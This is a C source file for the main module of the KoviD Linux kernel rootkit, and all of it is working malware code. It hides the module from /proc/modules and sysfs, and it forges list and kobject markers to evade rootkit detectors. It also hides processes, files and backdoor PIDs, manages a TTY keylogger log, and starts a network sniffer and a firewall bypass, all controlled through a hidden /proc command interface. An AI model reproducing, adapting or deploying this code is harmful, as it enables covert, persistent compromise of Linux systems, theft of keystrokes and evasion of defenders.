/**
 *  KoviD rootkit
 *
 *
 *    ██ ▄█▀ ▒█████   ██▒   █▓ ██▓▓█████▄
 *    ██▄█▒ ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌
 *   ▓███▄░ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌
 *   ▓██ █▄ ▒██   ██░  ▒██ █░░░██░░▓█▄   ▌
 *   ▒██▒ █▄░ ████▓▒░   ▒▀█░  ░██░░▒████▓
 *   ▒ ▒▒ ▓▒░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒
 *   ░ ░▒ ▒░  ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒
 *   ░ ░░ ░ ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░
 *   ░  ░       ░ ░        ░   ░     ░
 *                        ░        ░
 *
 * LKM rootkit by @hash
 *
 */
#include <linux/module.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/kernel.h>

#include "lkm.h"
#include "fs.h"

#define MAX_PROCFS_SIZE PAGE_SIZE
#define MAX_MAGIC_WORD_SIZE 16
#define MAX_64_BITS_ADDR_SIZE 16
#ifndef MODNAME
#pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
#endif
#ifndef PROCNAME
#error "Missing \'PROCNAME\' compilation directive. See Makefile."
#endif


#ifndef PRCTIMEOUT
/**
 * default timeout seconds
 * before /proc/kovid is removed
 */
#define _PRCTIMEOUT 360
#else
#define _PRCTIMEOUT PRCTIMEOUT
#endif

#define MIN(a,b) \
     ({ typeof (a) _a = (a); \
        typeof (b) _b = (b); \
       _a < _b ? _a : _b; })


enum {
    PRC_RESET = -1,
    PRC_READ,
    PRC_DEC,
    PRC_TIMEOUT = _PRCTIMEOUT
};

struct task_struct *tsk_sniff = NULL;
struct task_struct *tsk_prc = NULL;

static struct proc_dir_entry *rrProcFileEntry;
struct __lkmmod_t{ struct module *this_mod; };
static unsigned int op_lock;
static DEFINE_MUTEX(prc_mtx);
static DEFINE_SPINLOCK(elfbits_spin);

/** gcc  - fuck 32 bits shit (for now!) */
#ifndef __x86_64__
#error "fuuuuuu Support is only for x86-64"
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
#endif

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("whatever coorp");
MODULE_INFO(intree, "Y");

static struct list_head *mod_list;
static const struct __lkmmod_t lkmmod = {
    .this_mod = THIS_MODULE,
};


/*
 * kernel structures so the compiler
 * can know about sizes and data types
 */
/** kernel/params.c */
struct param_attribute
{
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs
{
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

// kernel/module.c
struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};
struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[0];
};

/*
 * sysfs restoration helpers.
 * Mostly copycat from the kernel with
 * light modifications to handle only a subset
 * of sysfs files
 */
static ssize_t show_refcnt(struct module_attribute *mattr,
        struct module_kobject *mk, char *buffer){
    return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
    __ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
    &modinfo_refcnt,
    NULL,
};

static void module_remove_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;

    attr = &mod->modinfo_attrs[0];
    if (attr && attr->attr.name) {
        sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
        if (attr->free)
            attr->free(mod);
    }
    kfree(mod->modinfo_attrs);
}

static int module_add_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;
    struct module_attribute *temp_attr;
    int error = 0;

    mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute) *
                (ARRAY_SIZE(modinfo_attrs) + 1)),
            GFP_KERNEL);
    if (!mod->modinfo_attrs)
        return -ENOMEM;

    temp_attr = mod->modinfo_attrs;
    attr = modinfo_attrs[0];
    if (!attr->test || attr->test(mod)) {
        memcpy(temp_attr, attr, sizeof(*temp_attr));
        sysfs_attr_init(&temp_attr->attr);
        error = sysfs_create_file(&mod->mkobj.kobj,
                &temp_attr->attr);
        if (error)
            goto error_out;
    }

    return 0;

error_out:
    module_remove_modinfo_attrs(mod);
    return error;
}

/*
 * Remove the module entries
 * in /proc/modules and /sys/module/<MODNAME>
 * Also backup references needed for
 * kv_unhide_mod()
 */
struct rmmod_controller {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
};
static struct rmmod_controller rmmod_ctrl;
static DEFINE_SPINLOCK(hiddenmod_spinlock);

static inline void kv_list_del(struct list_head *prev, struct list_head *next)
{
    next->prev = prev;
    prev->next = next;
}

static void kv_hide_mod(void) {
    struct list_head this_list;

    if (NULL != mod_list)
        return;
    /*
     *  sysfs looks more and less
     *  like this, before removal:
     *
     *  /sys/module/<MODNAME>/
     *  ├── coresize
     *  ├── holders
     *  ├── initsize
     *  ├── initstate
     *  ├── notes
     *  ├── refcnt
     *  ├── sections
     *  │   ├── __bug_table
     *  │   └── __mcount_loc
     *  ├── srcversion
     *  ├── taint
     *  └── uevent
     */

    /** Backup and remove this module from /proc/modules */
    this_list = lkmmod.this_mod->list;
    mod_list = this_list.prev;
    spin_lock(&hiddenmod_spinlock);

    /**
     * We bypass original list_del()
     */
    kv_list_del(this_list.prev, this_list.next);

    /*
     * To deceive certain rootkit hunters scanning for
     * markers set by list_del(), we perform a swap with
     * LIST_POISON. This strategy should be effective,
     * as long as you don't enable list debugging (lib/list_debug.c).
     */
    this_list.next = (struct list_head*)LIST_POISON2;
    this_list.prev = (struct list_head*)LIST_POISON1;

    spin_unlock(&hiddenmod_spinlock);

    /** Backup and remove this module from sysfs */
    rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
    rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
    kobject_del(lkmmod.this_mod->holders_dir->parent);

    /**
     * Again, mess with the known marker set by
     * kobject_del()
     */
    lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;

    /* __module_address will return NULL for us
     * as ong as we are "loading"... */
    lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
}

/*
 * This function is responsible for restoring module entries in both
 * /proc/modules and /sys/module/<module>/. After this function is
 * executed, the recommended action is to proceed with the rmmod
 * command to unload the module safely.
 */
static void kv_unhide_mod(void) {
    int err;
    struct kobject *kobj;

    if (!mod_list)
        return;

    /*
     * Sysfs is intrinsically linked to kernel objects. In this section,
     * we reinstate only the essential sysfs entries required when
     * performing rmmod.
     *
     * After the restoration process, the sysfs structure will
     * appear as follows:
     *
     * /sys/module/<MODNAME>/
     * ├── holders
     * ├── refcnt
     * └── sections
     *   └── __mcount_loc
     */

    /** Sets back the active state */
    lkmmod.this_mod->state = MODULE_STATE_LIVE;

    /** MODNAME is the parent kernel object */
    err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent, "%s", MODNAME);
    if (err)
        goto out_put_kobj;

    kobj = kobject_create_and_add("holders", &(lkmmod.this_mod->mkobj.kobj));
    if (!kobj)
        goto out_put_kobj;

    lkmmod.this_mod->holders_dir = kobj;

    /** Create sysfs representation of kernel objects */
    err = sysfs_create_group(&(lkmmod.this_mod->mkobj.kobj), &rmmod_ctrl.attrs->grp);
    if (err)
        goto out_put_kobj;

    /** Setup attributes */
    err = module_add_modinfo_attrs(lkmmod.this_mod);
    if (err)
        goto out_attrs;

    /** Restore /proc/module entry */
    spin_lock(&hiddenmod_spinlock);

    list_add(&(lkmmod.this_mod->list), mod_list);
    spin_unlock(&hiddenmod_spinlock);
    goto out_put_kobj;

out_attrs:
    /** Rewind attributes */
    if (lkmmod.this_mod->mkobj.mp) {
        sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj), &lkmmod.this_mod->mkobj.mp->grp);
        if (lkmmod.this_mod->mkobj.mp)
            kfree(lkmmod.this_mod->mkobj.mp->grp.attrs);
        kfree(lkmmod.this_mod->mkobj.mp);
        lkmmod.this_mod->mkobj.mp = NULL;
    }

out_put_kobj:
    /** Decrement refcount */
    kobject_put(&(lkmmod.this_mod->mkobj.kobj));
    mod_list = NULL;
}

static char *get_unhide_magic_word(void) {
    static char *magic_word;
    if(!magic_word)
        magic_word = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);

    /* magic_word must be freed later */
    return magic_word;
}

struct elfbits_t {
    char bits[MAX_PROCFS_SIZE+1];
    bool ready;
};
static struct elfbits_t ElfBits;

static void set_elfbits(char *bits) {
    if (bits) {
        spin_lock(&elfbits_spin);
        memset(&ElfBits, 0, sizeof(struct elfbits_t));
        snprintf(ElfBits.bits, MAX_PROCFS_SIZE, "%s", bits);
        ElfBits.ready = true;
        spin_unlock(&elfbits_spin);
    }
}

/** XXX: fix/improve this API */
static struct elfbits_t *get_elfbits(bool *ready) {
    spin_lock(&elfbits_spin);
    if (ElfBits.ready) {
        if (ready)
            *ready = ElfBits.ready;
        ElfBits.ready = false;
        spin_unlock(&elfbits_spin);
        return &ElfBits;
    }
    spin_unlock(&elfbits_spin);
    return NULL;
}

static int proc_dummy_show(struct seq_file *seq, void *data) {
    seq_printf(seq, "0\n");
    return 0;
}

static int open_cb(struct inode *ino, struct file *fptr) {
    return single_open(fptr, proc_dummy_show, NULL);
}

static ssize_t _seq_read(struct file *fptr, char __user *buffer,
        size_t count, loff_t *ppos) {
    int len = 0;
    bool ready = false;
    struct elfbits_t *elfbits;

    if(*ppos > 0 || !count)
        return 0;

    elfbits = get_elfbits(&ready);
    if (elfbits && ready) {
        char b[MAX_64_BITS_ADDR_SIZE+2] = {0};
        len = snprintf(b, sizeof(b),
                "%s\n", elfbits->bits);
        if (copy_to_user(buffer, b, len))
            return -EFAULT;
    } else {
        char b[MAX_MAGIC_WORD_SIZE+2] = {0};
        len = snprintf(b, sizeof(b),
                "%s\n", get_unhide_magic_word());
        if (copy_to_user(buffer, b, len))
            return -EFAULT;
    }

    *ppos = len;

    return len;
}
/*
 * This function removes the proc interface after a
 * certain amount of time has passed.
 * It can be re-activated using a magic
 * kill signal. It's important to have this feature
 * because the `rmmod` magic key has been dumped on it.
 */
static int proc_timeout(unsigned int t) {
    static unsigned int cnt = PRC_TIMEOUT;

    if (t == PRC_READ)
        return cnt;

    mutex_lock(&prc_mtx);
    if (t == PRC_RESET)
        cnt = PRC_TIMEOUT;
    else if (cnt > 0)
        cnt -= t;
    mutex_unlock(&prc_mtx);

    return cnt;
}

/**
 * Simple commands: hide, <PID>, show
 */
static ssize_t write_cb(struct file *fptr, const char __user *user,
        size_t size, loff_t *offset) {
    char *buf;
    pid_t pid;

    buf = kmalloc(size+1, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    if (copy_from_user(buf, user, size))
        goto efault_error;

    pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
    /**
     * Caution: INIT is off-limits
     * Tip: Ensure safety by refraining from hiding
     * essential system tasks
     */
    if(pid > 1)
        kv_hide_task_by_pid(pid, 0, CHILDREN);
    else {
        char *magik = get_unhide_magic_word();
        size_t len = strlen(buf);

        if(!len)
            goto leave;

        buf[strcspn(buf, "\r\n")] = 0;

        /* Hide PID as backdoor */
        if(!strncmp(buf, "-bd", MIN(3, size))) {
            char *tmp = &buf[4];
            int val = 0;
            tmp[strcspn(tmp, " ")] = 0;
            if (kstrtoint(tmp, 10, &val)) {
                prerr("Failed kstrtoint\n");
            } else {
                kv_hide_task_by_pid(val, 1, CHILDREN);
            }
        /* hide kovid module */
        } else if(!strcmp(buf, "-h") && !op_lock) {
            static unsigned int msg_lock = 0;
            if(!msg_lock) {
                msg_lock = 1;
                prinfo("Your module \'unhide\' magic word is: '%s'\n", magik);
            }
            op_lock = 1;
            kv_hide_mod();
        } else if(!strcmp(buf, magik) && op_lock) {
            op_lock = 0;
            kv_unhide_mod();
            /* list hidden tasks */
        } else if(!strcmp(buf, "-s")) {
            kv_show_saved_tasks();
            /* add name to the list of hidden files/directories */
        } else if(!strncmp(buf, "-a", MIN(2, size))) {
            char *s = &buf[3];
            s[strcspn(s, " ")] = 0;
            if (strlen(s)) {
                const char *tmp[] = {s,NULL};
                fs_add_name_rw(tmp);
            }
            /* unhide file/directory */
        } else if(!strncmp(buf, "-d", MIN(2, size))) {
            char *s = &buf[3];
            s[strcspn(s, " ")] = 0;
            if (strlen(s)) {
                const char *tmp[] = {s,NULL};
                fs_del_name(tmp);
            }
            /* show current hidden files/directories */
        } else if(!strcmp(buf, "-l")) {
            fs_list_names();
            /* set tty log file to be removed on rmmod */
        } else if (!strcmp(buf, "-t0")) {
            kv_keylog_rm_log(true);
            /* unset tty log file to be removed on rmmod */
        } else if (!strcmp(buf, "-t1")) {
            kv_keylog_rm_log(false);
            /* fetch base address of process */
        } else if (!strncmp(buf, "-b", MIN(2, size))) {
            char *tmp = &buf[3];
            tmp[strcspn(tmp, " ")] = 0;
            if (*tmp != '\0') {
                int res;
                unsigned long base;
                char bits[32+1] = {0};

                if (kstrtoint(tmp, 10, &res)) {
                    prerr("Failed kstrtoint\n");
                } else {
                    base = kv_get_elf_vm_start(res);
                    snprintf(bits, 32, "%lx", base);
                    set_elfbits(bits);
                }
            }
        }
    }
    proc_timeout(PRC_RESET);
leave:
    kfree(buf);
    return size;
efault_error:
    return -EFAULT;
}

/**
 * proc file callbacks and defs
 */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
static const struct file_operations proc_file_fops = {
    .owner =   THIS_MODULE,
    .open  =   open_cb,
    .read  =   _seq_read,
    .release = seq_release,
    .write =   write_cb,
};
#else
static const struct proc_ops proc_file_fops = {
    .proc_open  =   open_cb,
    .proc_read  =   _seq_read,
    .proc_release = seq_release,
    .proc_write =   write_cb,
};
#endif

int kv_is_proc_interface_loaded(void) {
    if (rrProcFileEntry)
        return true;
    return false;
}

int kv_add_proc_interface(void) {
    int lock = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid_t kuid;
    kgid_t kgid;
#endif
    /** is proc loaded? */
    if (rrProcFileEntry)
        return 0;

try_reload:
    rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
    if(lock && !rrProcFileEntry)
        goto proc_file_error;
    if(!lock) {
        if(!rrProcFileEntry) {
            lock = 1;
            kv_remove_proc_interface();
            goto try_reload;
        }
    }

    /* set proc file maximum size & user as root */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
    rrProcFileEntry->size = MAX_PROCFS_SIZE;
    rrProcFileEntry->uid = 0;
    rrProcFileEntry->gid = 0;
#else
    proc_set_size(rrProcFileEntry, MAX_PROCFS_SIZE);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid.val = 0;
    kgid.val = 0;
    proc_set_user(rrProcFileEntry, kuid, kgid);
#else
    proc_set_user(rrProcFileEntry, 0, 0);
#endif
#endif
    proc_timeout(PRC_READ);
    if (tsk_prc)
        kthread_unpark(tsk_prc);
    goto leave;
proc_file_error:
    prinfo("Could not create proc file.\n");
    return 0;
leave:
    prinfo("/proc/%s loaded, timeout: %ds\n", PROCNAME, PRC_TIMEOUT);
    return 1;
}

/**
 * Can be called from __exit
 * and outside of proc watchdog
 * context
 */
static void _proc_rm_wrapper(void) {
    mutex_lock(&prc_mtx);
    if(rrProcFileEntry) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
        remove_proc_entry(PROCNAME, NULL);
#else
        proc_remove(rrProcFileEntry);
#endif
        rrProcFileEntry = NULL;
        prinfo("/proc/%s unloaded.\n", PROCNAME);
    }
    mutex_unlock(&prc_mtx);
}

void kv_remove_proc_interface(void) {
    _proc_rm_wrapper();
    proc_timeout(PRC_RESET);
    kthread_park(tsk_prc);
}

static int _proc_watchdog(void *unused) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
      struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif
      for(;;) {
          if (kthread_should_park())
              kthread_parkme();
          if(kthread_should_stop()) {
              _proc_rm_wrapper();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
              kaddr->k_do_exit(0);
#else
              do_exit(0);
#endif
          }
          if (kv_is_proc_interface_loaded()) {
              if (proc_timeout(PRC_READ))
                  proc_timeout(PRC_DEC);
              else {
                  prinfo("/proc/kovid timeout\n");
                  kv_remove_proc_interface();
              }
          }
          ssleep(1);
      }
      return 0;
}

static void _unroll_init(void) {
    char *magik = get_unhide_magic_word();


    if (tsk_prc) {
        kthread_unpark(tsk_prc);
        kthread_stop(tsk_prc);
    }

    _proc_rm_wrapper();
    sys_deinit();
    kfree(magik);
    kv_pid_cleanup();
}

static int __init kv_init(void) {

    int rv = 0;
    char *magik, *procname_err = "";
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    struct kernel_syscalls *kaddr = NULL;
#endif
    if (strlen(PROCNAME) == 0) {
        procname_err = "Empty PROCNAME build parameter. Check Makefile.";
    } else if (!strncmp(PROCNAME, "changeme", 5)) {
        procname_err = "You must rename PROCNAME. Check Makefile.";
    } else if (!strncmp(PROCNAME, "kovid", 5) || !strncmp(PROCNAME, MODNAME, strlen(PROCNAME))) {
        procname_err = "PROCNAME should not be same as module name. Check Makefile.";
    }

    if (*procname_err != 0)
        goto procname_missing;

    if (!kv_pid_init(kv_kall_load_addr()))
        goto addr_error;

    magik = get_unhide_magic_word();
    if(!magik)
        goto magic_word_error;

    if (!sys_init())
        goto sys_init_error;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    kaddr = kv_kall_load_addr();
    if (!kaddr || !kaddr->k_do_exit)
        goto cont;
#endif
    tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
    if (!tsk_prc)
        goto unroll_init;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
cont:
#endif
    tsk_sniff = kv_sock_start_sniff();
    if (!tsk_sniff)
        goto unroll_init;

    if (!kv_sock_start_fw_bypass()) {
        prwarn("Error loading fw_bypass\n");
    }

    /** hide kthreads */
    kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
    kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);

    /** hide magic filenames & directories */
    fs_add_name_ro(kv_hide_str_on_load);

    /** hide magic filenames, directories and processes */
    fs_add_name_ro(kv_get_hide_ps_names());

    kv_scan_and_hide();


#ifndef DEBUG_RING_BUFFER
    /** *pr_info because it must be shown even if DEPLOY=1 */
    pr_info("Your module \'unhide\' magic word is: '%s'\n", magik);
    kv_hide_mod();
    op_lock = 1;
#endif

    prinfo(KERN_INFO "%s loaded.\n", MODNAME);
    goto leave;

unroll_init:
    prerr("Could not load basic functionality.\n");
    _unroll_init();
    rv = -EFAULT;
    goto leave;
addr_error:
    prerr("Could not get kernel function address, proc file not created.\n");
    rv = -EFAULT;
    goto leave;
magic_word_error:
    prerr("Could not load magic word. proc file not created\n");
    rv = -EFAULT;
    goto leave;
sys_init_error:
    prerr("Could not load syscalls hooks\n");
    kfree(magik);
    rv = -EFAULT;
    goto leave;
procname_missing:
    prerr("%s\n", procname_err);
    rv = -EFAULT;
leave:
    return rv;
}

static void __exit kv_cleanup(void) {
    char *magik = get_unhide_magic_word();
    if(magik != NULL) {
        kfree(magik);
        magik = NULL;
    }

    sys_deinit();
    kv_pid_cleanup();

    if (tsk_sniff && !IS_ERR(tsk_sniff)) {
        prinfo("stop sniff thread\n");
        kv_sock_stop_sniff(tsk_sniff);
    }

    kv_sock_stop_fw_bypass();

    if (tsk_prc && !IS_ERR(tsk_prc)) {
        prinfo("stop proc timeout thread\n");
        kthread_unpark(tsk_prc);
        kthread_stop(tsk_prc);
    }

    fs_names_cleanup();

    prinfo("kovid unloaded.\n");
}

module_init(kv_init);
module_exit(kv_cleanup);
